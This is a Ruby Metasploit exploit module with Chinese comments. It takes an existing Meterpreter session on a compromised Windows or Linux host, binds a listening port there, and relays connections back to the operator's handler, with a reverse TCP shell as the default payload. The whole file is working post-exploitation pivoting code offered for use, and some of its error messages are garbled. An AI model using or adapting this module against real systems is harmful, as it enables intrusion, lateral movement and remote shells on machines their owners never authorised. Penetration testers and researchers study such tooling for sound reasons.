##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require "json"
module PortForwardTracker
    def cleanup
      super

      if pfservice
        pfservice.deref
      end
    end

    attr_accessor :pfservice
end

class MetasploitModule < Msf::Exploit::Remote
  Rank = ManualRanking


  def initialize(info={})
        super(update_info(info,
        'Name'                 => "bind handler at session host",
        'Description'          => %q{
            This module will bind a handler  in  session host  
            },
        'License'              => MSF_LICENSE,
        'Platform'             => ['win','linux'],
        'SessionTypes'         => ['meterpreter'],
        'Author'               => ['acodervic@github'],
                'References'     =>  [ ],
        'Payload'        =>
          {
            'Space'       => 10000000,
            'BadChars'    => '',
            'DisableNops' => true
          },
        'Platform'       => %w[android apple_ios bsd java js linux osx nodejs php python ruby solaris unix win mainframe multi],
        'Arch'           => ARCH_ALL,
        'Targets'        => [ [ 'Wildcard Target', {} ] ],
        'DefaultTarget'  => 0,
        'DefaultOptions' => { 'PAYLOAD' => 'generic/shell_reverse_tcp' }
        ))
      register_options(
          [
            OptInt.new('SESSION', [true,'the target sessionid ']),
          ])
  end



  def exploit
    #TODO 重新连接后不会显示转发记录 实际上端口会继续占用
    if datastore['DisablePayloadHandler']
      print_error "DisablePayloadHandler is enabled, so there is nothing to do. Exiting!"
      return
    end
    sid=datastore['SESSION']
    if sid.nil?
      print_error('必须指定session"')
      return 
    end

    session=self.framework.sessions[sid]
    if session.nil?
      print_error("the session #{sid} is valid ")
      return 
    end

    if session.type!='meterpreter'
      print_error("only support Meterperter session")
    end

    service=session_fwd_services(session)
    
    lhost=datastore['LHOST'] # 192.168.56.1
    lport=datastore['LPORT'] #14444
    #start portfwd

    begin
      
      channel = session.net.socket.create(
      Rex::Socket::Parameters.new(
                'LocalPort' => lport,
                'Proto'     => 'tcp',
                'Server'    => true
        )
      )

            # Start the local TCP reverse relay in association with this stream
      relay = service.start_reverse_tcp_relay(channel,
        'LocalPort'         => channel.params.localport,
        'PeerHost'          => lhost,
        'PeerPort'          => lport,
        'MeterpreterRelay'  => true)
      datastore['relay']=relay
      datastore['meterpreter']=session
    rescue ::Exception => exception
      if exception.to_s.starts_with?('The address is already in use or unavailable')
        #代表地址已经启用了
      end
      #可能 远程已经开启了端口了
      print_status("尝试在会话上映射端口出错"+exception.message)
    end
    begin
    #=======================
        stime = Time.now.to_f
        timeout = datastore['ListenerTimeout'].to_i
        loop do
          break if session_created? && datastore['ExitOnSession']
          break if timeout > 0 && (stime + timeout < Time.now.to_f)
          Rex::ThreadSafe.sleep(1)
        end
    rescue ::Exception => exception
      print_error(exception.message)
    end 


    
  end


  def session_fwd_services(session)
              # If we haven't extended the session, then do it now since we'll
        # need to track port forwards
        if session.kind_of?(PortForwardTracker) == false
          session.extend(PortForwardTracker)
          session.pfservice = Rex::ServiceManager.start(Rex::Services::LocalRelay)
        end
        session.pfservice
  end



  #这个函数会在模块run完之后和job被杀死之后运行
  def cleanup
    relay=datastore['relay']
    if !relay.nil?
      print_status("清除端口转发记录")
      #如果创建了中继转发则关闭
      service=session_fwd_services(datastore['meterpreter'])
      #必须先停止相关的端口,否则将无法转发,即使转发了也不可能将流量成功转向过来
      #问题 如果前一次和session创建了一个 端口转发记录 14444 如果本地msfconsole死亡的时候没有成功关闭 
      #那么session客户端就会一直存在14444绑定.  再次启动的 msfconsole监听到的session中是无法获取到转发记录的 ! 所以也无法关闭
      #客户端的14444绑定,所以也就无法成功启动! 这个模块了,因为原有端口占用14444无法转流量转发到这个模块的handlerListener port 
      msg="";
      service.each_tcp_relay do |lh, lp, rh, rp, opts|  # 这对于上次未被成功关闭的转发记录是没用的 因为 service中没有 relay 记录
          if opts['Reverse'] == true
              # Stop the service
              if service.stop_reverse_tcp_relay(lp)
                msg="已成功停止上的TCP中继 #{lh || '0.0.0.0'}:#{lp}"
              else
                msg="无法停止TCP中继 #{lh || '0.0.0.0'}:#{lp}"
              end
              print_status(msg)
              break
          end
        end
    end
  end

end
